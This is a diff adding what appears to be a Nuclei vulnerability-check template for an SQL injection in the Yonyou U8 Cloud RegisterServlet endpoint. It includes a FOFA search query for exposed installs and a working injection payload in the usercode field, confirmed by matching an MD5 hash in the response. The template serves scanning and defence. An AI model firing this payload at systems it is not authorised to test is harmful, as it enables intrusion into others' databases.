@@ -1,0 +1,26 @@
+id: yonyou-u8-cloud-RegisterServlet-sql
+
+info:
+  name: 用友u8-cloud RegisterServlet SQL注入
+  author: Co5mos
+  severity: high
+  description:
+    用友U8 cloud的RegisterServlet接口对用户传入的参数未进行有效的过滤，攻击者可利用该漏洞进行sql注入。
+  metadata:
+    fofa-query: app="用友-U8-Cloud"
+  tags: yonyou, sqli
+
+http:
+  - raw:
+      - |
+        POST /servlet/RegisterServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        usercode=1' and substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)>0-- 
+  
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==200 && contains(body_1, "e10adc3949ba59abbe56e057f20f883e")'
